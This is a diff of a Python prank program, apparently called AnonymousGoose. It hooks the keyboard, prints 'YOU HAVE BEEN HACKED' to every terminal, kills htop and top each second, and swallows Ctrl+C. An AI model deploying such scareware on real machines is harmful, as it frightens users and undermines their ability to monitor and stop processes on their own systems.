@@ -3,19 +3,8 @@ import time
 import pyxhook
 
 from term_utils import Term
-from detect_term import DetectTerm
 from command_helper import CommandHelper
 
-print(Term.find_terminal())
-time.sleep(1)
-Term.print_all("YOU HAVE BEEN HACKED.\n")
-
-term1 = Term.create_tty()
-print(term1)
-term2 = Term.create_tty()
-print(term2)
-term3 = Term.create_tty()
-print(term3)
 
 class AnonymousGoose:
 	def __init__(self):
@@ -28,22 +17,21 @@ class AnonymousGoose:
 		self.keyboard_listener.start()
 		# print(DetectTerm.find_terminal())
 		# time.sleep(1)
-		Term.print("YOU HAVE BEEN HACKED.\n")
+		Term.print_all("YOU HAVE BEEN HACKED.\n")
 		self.run()
 
-while True:
-	if CommandHelper.run("killall htop") == 0 or CommandHelper.run("killall top") == 0:
-		Term.print("You tough that this will be as easy as this?\n")
-	time.sleep(1)
 	def __del__(self):
 		if not self.stopped:
 			self.keyboard_listener.cancel()
 
 	def run(self):
 		while not self.should_exit:
-			if CommandHelper.run("killall htop") == 0 or CommandHelper.run("killall top") == 0:
-				TermUtils.print("You tough that this will be as easy as this?\n")
-			time.sleep(1)
+			try:
+				if CommandHelper.run("killall htop") == 0 or CommandHelper.run("killall top") == 0:
+					Term.print_all("You tough that this will be as easy as this?\n")
+				time.sleep(1)
+			except KeyboardInterrupt:
+				...
 
 	def key_pressed(self, key):
 		if key.Ascii == 27:
